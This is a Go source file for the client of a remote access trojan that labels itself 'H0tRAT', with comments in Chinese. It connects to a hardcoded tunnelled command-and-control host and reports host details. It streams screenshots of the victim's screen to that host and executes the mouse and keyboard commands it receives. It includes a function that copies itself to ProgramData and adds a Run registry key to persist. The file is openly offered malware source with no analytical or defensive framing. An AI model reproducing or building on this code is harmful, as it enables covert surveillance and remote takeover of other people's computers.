package client

import (
	"bufio"
	"bytes"
	"fmt"
	"github.com/go-vgo/robotgo"
	"golang.org/x/sys/windows/registry"
	"image/jpeg"
	"log"
	"net"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"sync"
	"time"
	"ylc/src/demo/MyConst"
	"ylc/src/demo/util"
)

const (
	IP = "selectbyylc.e3.luyouxia.net:13869"
)

const (
	VERSION = "1.0.0"
)

var isturn = true
var stopScreen bool
var wg sync.WaitGroup

func Ma() {

	connectNew()

}

func heartbeat(conn net.Conn) {
	for {
		err := util.SendHead(byte(util.HEART), conn)
		if err != nil {
			fmt.Println("心跳丢失===》连接断开")
			connectNew()
			return
		}
		fmt.Println("连接了==========")
		time.Sleep(time.Second * 10)
	}
	wg.Done() // 协程计数器加-1
}

func connectNew() {
	wg.Add(3) // 协程计数器 +1
	ipEncryptPath, err := util.EncryptString("ylcworld19990709", IP)
	ipDecryptPath, err := util.DecryptString("ylcworld19990709", ipEncryptPath)
	//go AddToStartup()
	inetSocketAddress, _ := net.ResolveTCPAddr("tcp", ipDecryptPath)

	socket, err := net.DialTCP("tcp", nil, inetSocketAddress)
	if err != nil {
		fmt.Println(err)
		connectNew()
		return
	}
	defer socket.Close()
	//// IO流
	dataOutputStream := bufio.NewWriter(socket)

	// 发送信息
	fmt.Fprintln(dataOutputStream, "H0tRAT")
	fmt.Fprintln(dataOutputStream, "USER")
	fmt.Fprintln(dataOutputStream, "HOSTNAME")
	fmt.Fprintln(dataOutputStream, runtime.GOOS)
	fmt.Fprintln(dataOutputStream, IP)
	fmt.Fprintln(dataOutputStream, "测试地址")
	fmt.Fprintln(dataOutputStream, "测试名字")
	fmt.Fprintln(dataOutputStream, strconv.Itoa(1111))
	fmt.Fprintln(dataOutputStream, "测试")
	fmt.Fprintln(dataOutputStream, VERSION)
	fmt.Fprintln(dataOutputStream, "360")

	dataOutputStream.Flush()
	//协程计数器加-1
	go doSomeThing(socket)
	go heartbeat(socket)

	wg.Wait() //等待协程计数器为0 退出
	fmt.Println("abc========================")

}

func createScreen(socket net.Conn) {
	// 获取当前屏幕的大小

	util.SendHead(1, socket)
	for {
		time.Sleep(time.Millisecond * 100)

		screen, err := CaptureScreenAsJPEG(10)
		if err != nil {
			fmt.Println(err)
		}
		////compress := util.Compress(screen)

		err = util.Send(2, screen, socket)
		if err != nil {
			return
		}

		if stopScreen {
			break
		}
	}
}

// CaptureScreenAsJPEG 截图并返回JPEG格式的字节数组
func CaptureScreenAsJPEG(quality int) ([]byte, error) {
	// 获取屏幕的尺寸
	screenX, screenY := robotgo.GetScreenSize()
	// 创建一个矩形，表示要截取的区域
	// 截取屏幕区域
	bitmap := robotgo.CaptureScreen(0, 0, screenX, screenY)
	// 释放内存
	defer robotgo.FreeBitmap(bitmap)
	// 转换为图片对象
	img := robotgo.ToImage(bitmap)

	// 设置JPEG压缩参数
	var opt jpeg.Options
	opt.Quality = quality
	buf := new(bytes.Buffer)
	err := jpeg.Encode(buf, img, &opt)

	// 编码为JPEG格式
	if err != nil {
		return nil, err
	}
	compress, err := util.Compress(buf.Bytes())
	return compress, nil
}
func doSomeThing(socket net.Conn) {
	for {
		time.Sleep(time.Millisecond)
		reader := bufio.NewReader(socket)
		receiveHead, err := util.ReceiveHead(reader)
		if err != nil {
			return
		}
		fmt.Println("head", receiveHead)
		switch string(receiveHead) {
		//心跳
		case string(99):
			fmt.Println("heart...")

		//屏幕监控
		case string(1):
			stopScreen = false
			go createScreen(socket)
		case string(3):
			stopScreen = true
		case string(MyConst.MOUSE_PRESSED):
			length := util.ReceiveLength(reader)
			context, _ := util.ReceiveContext(reader, length)
			util.MousePress(string(context))
		case string(MyConst.MOUSE_MOVED):
			length := util.ReceiveLength(reader)
			fmt.Println("this length:", length)
			context, _ := util.ReceiveContext(reader, length)
			util.MouseMove(string(context))
		case string(MyConst.MOUSE_RELEASED):
			length := util.ReceiveLength(reader)
			context, _ := util.ReceiveContext(reader, length)
			util.MouseRelease(string(context))
		case string(MyConst.MOUSE_DRAGGED):
			length := util.ReceiveLength(reader)
			context, _ := util.ReceiveContext(reader, length)
			util.MouseDragged(string(context))
		case string(MyConst.MOUSE_WHEEL):
			length := util.ReceiveLength(reader)
			context, _ := util.ReceiveContext(reader, length)
			util.MouseWheel(string(context))
		case string(MyConst.KEY_PRESSED):
			length := util.ReceiveLength(reader)
			context, _ := util.ReceiveContext(reader, length)
			util.KeyPress(string(context))
		case string(MyConst.KEY_RELEASED):
			length := util.ReceiveLength(reader)
			context, _ := util.ReceiveContext(reader, length)
			util.KeyReleased(string(context))
		}

	}
	wg.Done() // 协程计数器加-1

}

func AddToStartup() {
	//复制程序到指定目录
	util.CopyToProgramData()
	exePath := filepath.Join("C:\\ProgramData", filepath.Base(os.Args[0]))
	exeName := filepath.Base(exePath)

	// 打开注册表项
	key, err := registry.OpenKey(registry.CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", registry.ALL_ACCESS)
	if err != nil {
		log.Fatal(err)
	}
	defer key.Close()

	// 检查是否已存在该项
	_, _, err = key.GetStringValue(exeName)
	if err == nil {
		// 如果已存在，则不需要重复写入
		return
	}
	encryptPath, err := util.EncryptString("ylcworld19990709", exePath)

	// 写入注册表项
	decryptPath, err := util.DecryptString("ylcworld19990709", encryptPath)
	err = key.SetExpandStringValue(exeName, decryptPath)
	if err != nil {
		log.Fatal(err)
	}
	wg.Done() // 协程计数器加-1
}
